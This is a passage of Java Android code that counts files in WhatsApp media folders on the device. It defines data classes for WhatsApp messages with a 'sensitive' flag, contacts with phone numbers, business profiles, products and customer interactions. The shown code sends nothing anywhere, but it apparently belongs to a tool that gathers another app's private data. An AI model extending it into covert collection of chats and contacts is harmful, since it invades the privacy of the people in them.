            Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images/",
            Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video/",
            Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Documents/",
            Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Audio/"
        };
        
        for (String path : mediaPaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                File[] files = dir.listFiles();
                if (files != null) {
                    count += files.length;
                }
            }
        }
        return count;
    }
    
    // Data classes
    public static class WhatsAppMessage {
        private String id;
        private String sender;
        private String content;
        private long timestamp;
        private String type;
        private boolean isSensitive;
        
        public WhatsAppMessage(String id, String sender, String content, long timestamp, String type) {
            this.id = id;
            this.sender = sender;
            this.content = content;
            this.timestamp = timestamp;
            this.type = type;
            this.isSensitive = false;
        }
        
        // Getters and setters
        public String getId() { return id; }
        public String getSender() { return sender; }
        public String getContent() { return content; }
        public long getTimestamp() { return timestamp; }
        public String getType() { return type; }
        public boolean isSensitive() { return isSensitive; }
        public void setSensitive(boolean sensitive) { isSensitive = sensitive; }
    }
    
    public static class WhatsAppContact {
        private long id;
        private String name;
        private String phoneNumber;
        
        public WhatsAppContact(long id, String name, String phoneNumber) {
            this.id = id;
            this.name = name;
            this.phoneNumber = phoneNumber;
        }
        
        // Getters
        public long getId() { return id; }
        public String getName() { return name; }
        public String getPhoneNumber() { return phoneNumber; }
    }
    
    public static class WhatsAppBusinessProfile {
        private String businessName;
        private String description;
        private String address;
        private String website;
        
        public WhatsAppBusinessProfile() {
            // Default constructor
        }
        
        // Getters
        public String getBusinessName() { return businessName; }
        public String getDescription() { return description; }
        public String getAddress() { return address; }
        public String getWebsite() { return website; }
    }
    
    public static class WhatsAppProduct {
        private String id;
        private String name;
        private String price;
        private String description;
        
        public WhatsAppProduct(String id, String name, String price, String description) {
            this.id = id;
            this.name = name;
            this.price = price;
            this.description = description;
        }
        
        // Getters
        public String getId() { return id; }
        public String getName() { return name; }
        public String getPrice() { return price; }
        public String getDescription() { return description; }
    }
    
    public static class WhatsAppCustomerInteraction {
        private String customerId;
        private String customerName;
        private String interactionType;
        private long timestamp;
        
        public WhatsAppCustomerInteraction(String customerId, String customerName, String interactionType, long timestamp) {
            this.customerId = customerId;
            this.customerName = customerName;
            this.interactionType = interactionType;
            this.timestamp = timestamp;
        }
        
        // Getters
        public String getCustomerId() { return customerId; }
        public String getCustomerName() { return customerName; }
        public String getInteractionType() { return interactionType; }
        public long getTimestamp() { return timestamp; }
    }
} 